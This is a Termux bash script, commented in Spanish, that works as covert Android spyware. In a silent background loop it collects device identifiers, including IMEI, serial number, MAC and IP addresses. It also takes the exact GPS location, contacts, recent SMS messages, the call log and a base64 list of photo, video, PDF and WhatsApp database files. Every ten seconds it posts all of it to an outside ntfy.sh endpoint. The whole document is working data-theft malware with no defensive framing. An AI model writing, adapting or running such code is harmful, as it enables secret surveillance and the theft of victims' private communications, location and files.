#!/data/data/com.termux/files/usr/bin/bash
# Zo – extractor silencioso para Alfa en Zeta 🛰️

# == CONFIG ==
N="https://ntfy.sh/pe9278301"  # endpoint único
T=10                           # latencia entre ráfagas (seg)
S="🧟ZetaExfil"                # tag interno

# == UTILS ==
q(){ curl -sS -X POST "$N" -H "Title: $S" -d "$1" 2>/dev/null & }
silent(){"$@" 2>/dev/null;}

# == GRABACIÓN BRUTAL ==
while :;do
  # 1. Red & HW IDs
  mac=$(silent ip link show | awk '/link\/ether/{print$2}')
  ipv4=$(silent ifconfig | awk '/inet /&&$2!="127.0.0.1"{print$2}')
  ipv6=$(silent ifconfig | awk '/inet6 /&&$2!="::1"{print$2}')
  imei=$(silent termux-telephony-deviceinfo | jq -r '.[0].imei')
  sn=$(silent getprop ro.serialno)
  hw=$(silent getprop ro.hardware)
  brand=$(silent getprop ro.product.brand)
  model=$(silent getprop ro.product.model)
  android=$(silent getprop ro.build.version.release)
  sdk=$(silent getprop ro.build.version.sdk)

  # 2. Ubicación exacta (GPS+network)
  loc=$(silent termux-location -p gps -r once | jq -r '"\(.latitude),\(.longitude) ±\(.accuracy)m"')

  # 3. Contactos + SMS + CALLS
  contacts=$(silent termux-contact-list | jq -c 'map({n:.name,t:.number})')
  sms=$(silent termux-sms-list -l 50 | jq -c 'map({from:.number,body:.body,date:.received})')
  calls=$(silent termux-call-log -l 20 | jq -c 'map({num:.number,type:.type,date:.date})')

  # 4. Lista archivos sensibles (DCIM, WhatsApp, Downloads)
  files=$(find /sdcard -type f \( -iname "*.jpg" -o -iname "*.mp4" -o -iname "*.pdf" -o -iname "*.db" -o -iname "*.crypt*" \) 2>/dev/null | head -50 | base64 -w 0)

  # 5. Ensamblaje
  payload="🔥ZetaExfil🔥
📱 $brand $model | Android $android (SDK $sdk)
🎛️ HW: $hw | SN: $sn
📡 MAC: $mac | IPv4: $ipv4 | IPv6: $ipv6
📲 IMEI: $imei
📍 Ubic: ${loc:-'GPS off'}
👥 Contactos: $contacts
💬 SMS: $sms
📞 Calls: $calls
📂 Files(b64): $files"

  q "$payload"
  sleep $T
done &
